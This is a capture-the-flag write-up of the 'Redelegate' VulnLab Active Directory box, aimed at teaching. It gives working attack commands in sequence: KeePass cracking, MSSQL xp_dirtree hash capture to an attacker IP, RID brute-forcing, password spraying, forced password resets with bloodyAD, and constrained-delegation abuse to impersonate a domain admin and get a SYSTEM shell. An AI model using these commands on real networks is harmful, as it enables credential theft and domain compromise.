---
title: "Redelegate VulnLab" 
date: 2025-08-18 23:50:00 0000+
tags: [WriteUp, Redelegate, VL, Enumeration, Active Directory, SMB, ConstrainedDelegation, Rusthound-CE, Delegation, RID Bruteforcing, TrustedToAuthForDelegate, Lateral Movement, Bloodhound, Privilege Escalation, MSSQL, PasswordSpraying, AllowedToDelegate, Windows]
categories: [WriteUps,VulnLab]
image:
  path: /assets/images/Redelegate_VL/preview_redelegate.png
---
# Redelegate VulnLab Writeup

Redelegate is a VulnLab Hard Active Directory box hosted on HackTheBox which is mostly based on constrained delegation over a machine account, this box starts off with anonymous access to an FTP share and then from there we get access to a kdbx file containing MSSQL credentials but it was of no use cause it only allowed us to bruteforce the RIDs to find out all the domain users and computers and finally we generate a password list using a hint given through the FTP share and one of the users on the domain have the password in the generated list, did some lateral movement in the AD environment and we have a low privileged shell on the box, after more enumeration we found that a account has SeEnableDelegationPrivilege set on them which allows us to set the Constrained Delegation through Protocol Transition which lets us impersonate the Domain admin account cause the administrator account was set to NOT_DELEGATED giving us the SYSTEM shell on the box.

![image.png](/assets/images/Redelegate_VL/image.png)

## Initial Enumeration

As always we are gonna start off with the rustmap to find open ports and services running on the domain.

```bash
rustmap.py -ip 10.129.234.50
```

The results are:

```text
# Nmap 7.94SVN scan initiated Mon Aug 18 18:05:00 2025 as: nmap -sC -sV -v -p 21,53,80,88,135,139,389,445,464,593,636,3268,3269,3389,5985,9389,47001,49664,49665,49666,49667,49669,49932,51064,60904,60905,60911,60915,60927,60929 -oA nmap/redelegate 10.129.234.50
Nmap scan report for 10.129.234.50
Host is up (0.28s latency).

PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 10-20-24  01:11AM                  434 CyberAudit.txt
| 10-20-24  05:14AM                 2622 Shared.kdbx
|_10-20-24  01:26AM                  580 TrainingAgenda.txt
| ftp-syst: 
|_  SYST: Windows_NT
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-08-18 12:35:59Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: redelegate.vl0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: redelegate.vl0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2025-08-18T12:37:08+00:00; +50s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: REDELEGATE
|   NetBIOS_Domain_Name: REDELEGATE
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: redelegate.vl
|   DNS_Computer_Name: dc.redelegate.vl
|   DNS_Tree_Name: redelegate.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2025-08-18T12:36:59+00:00
| ssl-cert: Subject: commonName=dc.redelegate.vl
| Issuer: commonName=dc.redelegate.vl
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-04-09T10:21:45
| Not valid after:  2025-10-09T10:21:45
| MD5:   5f3d:bd81:c090:09d0:e46b:9ac4:6230:e6b1
|_SHA-1: 3f25:13ce:17c9:208b:b641:99b7:e8b5:9248:a3ae:a0e8
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49932/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
|_ssl-date: 2025-08-18T12:37:09+00:00; +51s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-08-18T12:34:57
| Not valid after:  2055-08-18T12:34:57
| MD5:   bb92:1ce4:f49b:dfd2:1950:f9e4:5057:cc99
|_SHA-1: a3a1:80b3:9244:67b5:1007:a295:5b2b:55d6:3279:2822
|_ms-sql-info: ERROR: Script execution failed (use -d to debug)
|_ms-sql-ntlm-info: ERROR: Script execution failed (use -d to debug)
51064/tcp open  msrpc         Microsoft Windows RPC
60904/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
60905/tcp open  msrpc         Microsoft Windows RPC
60911/tcp open  msrpc         Microsoft Windows RPC
60915/tcp open  msrpc         Microsoft Windows RPC
60927/tcp open  msrpc         Microsoft Windows RPC
60929/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 50s, deviation: 0s, median: 50s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-08-18T12:37:02
|_  start_date: N/A

Read data files from: /usr/bin//share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Aug 18 18:06:29 2025 -- 1 IP address (1 host up) scanned in 88.72 seconds

```

Looking at the results we can say its an active directory box, having ldap, smb , dns and a web server ports open on it.

I will add **dc.redelegate.vl** and **redelegate.vl** to my /etc/hosts file to resolve the dns.

### FTP Enumeration

The port 21 is open on the box, lets enumerate FTP.

```bash
nxc ftp redelegate.vl -u 'anonymous' -p ''
```

![image.png](/assets/images/Redelegate_VL/image%201.png)

We have anonymous login, lets list what all we have on the server.

```bash
ftp redelegate.vl
```

![image.png](/assets/images/Redelegate_VL/image%202.png)

Downloading all the files to our local system for inspection.

The CyberAudit.txt states that.

![image.png](/assets/images/Redelegate_VL/image%203.png)

The TrainingAgenda.txt states that.

![image.png](/assets/images/Redelegate_VL/image%204.png)

We can see a potential password “**SeasonYear!”,** this could be a password or its meaning could be a password like Autumn2021, Winter2020 etc.

Also we have a **Shared.kdbx** file, its a keepass file, and its encrypted with a password.

Lets get its hash using keepass2john.py

```bash
keepass2john.py Shared.kdbx
```

![image.png](/assets/images/Redelegate_VL/image%205.png)

Cracking it using Hashcat.

![image.png](/assets/images/Redelegate_VL/image%206.png)

First lets make a wordlist of season + year + !

I wrote this simple python code to generate a passwords list.

```python
seasons = ['Autumn','Fall','Winter','Spring','Summer']
seasons_all = []
password=""
years = []
for m in range(1000,3000):
  years.append(m)
for i in seasons:
    seasons_all.append(i.lower())
    seasons_all.append(i)
for i in years:
  for j in seasons_all:
    password = password + j + str(i) + '!' +'\n'
with open('password-test.txt','w') as f:
  f.write(password)
```

This generated a password-test.txt file, will be using this file to potentially crack the password of **Shared.kdbx.**

```bash
hashcat -m 13400 ftp/sharedkdbx.hash password-test.txt
```

![image.png](/assets/images/Redelegate_VL/image%207.png)

The password was found to be **Fall2024!.**

Now lets export anything present in our kdbx file.

```bash
keepassxc-cli export ftp/Shared.kdbx -f csv
```

![image.png](/assets/images/Redelegate_VL/image%208.png)

I cleaned up a bit using awk and sed.

![image.png](/assets/images/Redelegate_VL/image%209.png)

I created two files usernames.txt and passwords.txt. 

![image.png](/assets/images/Redelegate_VL/image%2010.png)

Tried to login in FTP using the creds of **FTPUser** but it failed.

### Web Enumeration

Port 80 is open on the box, lets visit [http://redelegate.vl](http://redelegate.vl).

![image.png](/assets/images/Redelegate_VL/image%2011.png)

Just a normal IIS server running.

Lets do some directory busting using gobuster.

![image.png](/assets/images/Redelegate_VL/image%2012.png)

Did not find anything useful there too.

### MSSQL Enumeration

We notice that on port 49932 there is MS SQL server 2019 running this service usually runs on 1433 but it is running on a different port and we also have the credentials for the SQL user too so lets test it.

```bash
nxc mssql redelegate.vl --port 49932 -u 'SQLGuest' -p 'zDPBpaF4FywlqIv11vii' --local-auth
```

![image.png](/assets/images/Redelegate_VL/image%2013.png)

It works with the **Local-auth** parameter.

Now lets use mssqlclient.py to connect to the server.

```bash
impacket-mssqlclient -p 49932 redelegate.vl/'SQLGuest':'zDPBpaF4FywlqIv11vii'@dc.redelegate.vl
```

![image.png](/assets/images/Redelegate_VL/image%2014.png)

And we have a shell!

Now I enumerate every database in the server and did not find anything.

Finally proceeded with the UNC path injection attack.

```sql
xp_dirtree //10.10.14.24//share//nothing 
```

Captured the hash of the **SQL_SVC** user.

![image.png](/assets/images/Redelegate_VL/image%2015.png)

Lets see if we can crack this hash, saving it to a file names sqlsvc.hash

But I wasn’t able to crack it hash.

Now since we have a valid authentication with the NetExec across the SQL server we can also bruteforce the RIDs on the server.

```bash
nxc mssql redelegate.vl --port 49932 -u 'SQLGuest' -p 'zDPBpaF4FywlqIv11vii' --local-auth --rid-brute
```

![image.png](/assets/images/Redelegate_VL/image%2016.png)

So the usernames and computer accounts captured are:

```text
Administrator
Guest
krbtgt
SQLServer2005SQLBrowserUser$WIN-Q13O908QBPG
DC$
FS01$
Christine.Flanders
Marie.Curie
Helen.Frost
Michael.Pontiac
Mallory.Roberts
James.Dinkleberg
Helpdesk
IT
Finance
DnsAdmins
DnsUpdateProxy
Ryan.Cooper
sql_svc
```

### Password Spray

Now we have all the usernames and also the password lists.

Lets just perform a password spray on all the accounts

```bash
nxc ldap redelegate.vl -u domainusers.txt -p passwords.txt --continue-on-success | grep "[+]"
```

![image.png](/assets/images/Redelegate_VL/image%2017.png)

We have a valid hit !

### SMB Enumeration

Now lets enumerate shares on the box using Marie’s creds.

```bash
nxc smb redelegate.vl -u 'Marie.Curie' -p 'Fall2024!' --shares
```

![image.png](/assets/images/Redelegate_VL/image%2018.png)

No valid share was found as her.

So lets dump the whole domain data using bloodhound and do some graphical analysis.

### Bloodhound

Using rusthound-ce to gather data and we analyze it in bloodhound-ce

```bash
rusthound-ce -d redelegate.vl -u 'marie.curie' -p 'Fall2024!' -f dc.redelegate.vl -c All -z
```

![image.png](/assets/images/Redelegate_VL/image%2019.png)

Uploading the data to bloodhound web ingestor.

## Exploitation

After analysis of LDAP data in bloodhound this is following path we will follow to get to **FS01$** computer account.

![image.png](/assets/images/Redelegate_VL/image%2020.png)

### Marie.Curie → Helen.Frost

**Marie** is a member of **HELPDESK** group and can change the password of **Helen**, lets exploit this using **bloodyAD**.

![image.png](/assets/images/Redelegate_VL/image%2021.png)

```bash
bloodyAD -u 'Marie.Curie' -p 'Fall2024!' --host 'dc.redelegate.vl' -d 'redelegate.vl' set password 'helen.frost' 'aashwin10!'
```

![image.png](/assets/images/Redelegate_VL/image%2022.png)

Marking **Helen.Frost** as owned.

### Helen.Frost → FS01$

Lets do a password change attack on **FS01$** as we have **genericAll** on **FS01$**

![image.png](/assets/images/Redelegate_VL/image%2023.png)

Using bloodyAD to perform it.

```bash
bloodyAD -u 'Helen.Frost' -p 'aashwin10!' --host 'dc.redelegate.vl' -d 'redelegate.vl' set password 'FS01$' 'aashwin10!'
```

![image.png](/assets/images/Redelegate_VL/image%2024.png)

We have now owned **FS01$.**

### Shell as Helen.Frost.

Checking for winrm access as Helen.

```bash
nxc winrm redelegate.vl -u 'helen.frost' -p 'aashwin10!'
```

![image.png](/assets/images/Redelegate_VL/image%2025.png)

We can login as her and it says pwned so we have elevated privileges.

Logging in using evil-winrm.

```bash
evil-winrm -i redelegate.vl -u 'helen.frost' -p 'aashwin10!'
```

We can now retrieve out user flag in the Helen’s desktop.

![image.png](/assets/images/Redelegate_VL/image%2026.png)

Submitting our user.txt flag.

Now while listing the privileges as Helen.Frost.

![image.png](/assets/images/Redelegate_VL/image%2027.png)

We have **SeEnableDelegationPrivilege** means we have the permissions to enable computer and user accounts to be trusted for delegation.

## Shell as Ryan.Cooper (DA)

### Constrained Delegation

To do this we must first enable **TrustedToAuthForDelegation.**

Presently it is set to False.

```powershell
Get-ADComputer -properties * -filter *
```

![image.png](/assets/images/Redelegate_VL/image%2028.png)

We can set it to TRUE using bloodyAD.

```bash
bloodyAD -u 'Helen.Frost' -p 'aashwin10!' --host 'dc.redelegate.vl' -d 'redelegate.vl' add uac 'FS01$' -f 'TRUSTED_TO_AUTH_FOR_DELEGATION'
```

![image.png](/assets/images/Redelegate_VL/image%2029.png)

We can do that because H**elen.Frost** has **genericAll** on **FS01$.**

Rechecking it.

```powershell
Get-ADComputer -properties * -filter *
```

![image.png](/assets/images/Redelegate_VL/image%2030.png)

We can also confirm this by using Netexec.

```bash
nxc ldap redelegate.vl -u 'helen.frost' -p 'aashwin10!' --find-delegation
```

![image.png](/assets/images/Redelegate_VL/image%2031.png)

Now the next thing we want to set is the **msDS-AllowedToDelegateTo**

Lets set that using BloodyAD

```bash
bloodyAD -u 'Helen.Frost' -p 'aashwin10!' --host 'dc.redelegate.vl' -d 'redelegate.vl' set object 'FS01$' 'msDS-AllowedToDelegateTo' -v 'CIFS/DC.REDELEGATE.VL'
```

![image.png](/assets/images/Redelegate_VL/image%2032.png)

Lets verify this using NetExec.

```bash
nxc ldap redelegate.vl -u 'helen.frost' -p 'aashwin10!' --find-delegation
```

![image.png](/assets/images/Redelegate_VL/image%2033.png)

See the **DelegationRights** have been updated!.

Now lets request a service ticket for the more privileged user.

```bash
impacket-getST -spn 'CIFS/dc.redelegate.vl' -impersonate 'administrator' redelegate.vl/'FS01$':'aashwin10!'
```

![image.png](/assets/images/Redelegate_VL/image%2034.png)

We cannot Impersonate as an Administrator and that was odd.

Lets check the Administrator account properties to see if something’s present in its UAC.

```bash
bloodyAD -u 'Helen.Frost' -p 'aashwin10!' --host 'dc.redelegate.vl' -d 'redelegate.vl' get object 'Administrator'
```

![image.png](/assets/images/Redelegate_VL/image%2035.png)

When I listed the details of the Administrator account its UAC is set to **NOT_DELEGATED** i.e. its a protected account we cant do that.

However we have another account in the domain which is the domain administrator and its **Ryan.Cooper.**

So lets impersonate as him.

```bash
impacket-getST -spn 'CIFS/dc.redelegate.vl' -impersonate 'Ryan.Cooper' redelegate.vl/'FS01$':'aashwin10!'
```

![image.png](/assets/images/Redelegate_VL/image%2036.png)

Exporting that ticket to our KRB5CCNAME and using klist to list and verify it.

![image.png](/assets/images/Redelegate_VL/image%2037.png)

Now listing shares on the DC using the kerberos cache cause the ticket is loaded in memory.

```bash
nxc smb redelegate.vl --use-kcache --shares
```

![image.png](/assets/images/Redelegate_VL/image%2038.png)

Now lets just use impacket’s psexec to get on the box.

```bash
impacket-psexec -k -no-pass redelegate.vl/'Ryan.Cooper'@dc.redelegate.vl
```

![image.png](/assets/images/Redelegate_VL/image%2039.png)

Grabbing that root.txt file in the administrator’s Desktop.

![image.png](/assets/images/Redelegate_VL/image%2040.png)

Rooted!

**NOTE: When we set the msDS-AllowedToDelegateTo attribute on FS01$, I redid the bloodhound scan and it did show me this path.**

![image.png](/assets/images/Redelegate_VL/image%2041.png)

![image.png](/assets/images/Redelegate_VL/image%2042.png)

Thanks for reading 😊
